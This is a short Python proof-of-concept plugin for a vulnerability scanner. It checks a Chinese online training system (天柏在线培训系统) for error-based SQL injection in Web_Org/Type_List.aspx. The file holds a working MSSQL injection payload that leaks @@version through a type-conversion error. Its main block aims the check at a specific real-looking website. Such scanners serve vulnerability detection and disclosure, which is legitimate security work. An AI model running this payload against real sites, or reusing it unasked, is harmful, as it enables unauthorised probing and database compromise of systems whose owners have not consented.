#coding:utf-8
from lib.curl import *
#--coding:utf-8--*--
#Name: 天柏在线培训系统sql注入都是在不同链接找的边找边写
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0144529
#Author:xq17
def assign(service, arg):
    if service == "tianbo_train":
        return True, arg
        
        
def audit(arg): 
    payload = 'Web_Org/Type_List.aspx?typeid=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'WtFaBcMicrosoft' in res :
        security_hole('found sql Injection:'+arg+payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('tianbo_train','http://www.jzkjpxw.cn/')[1])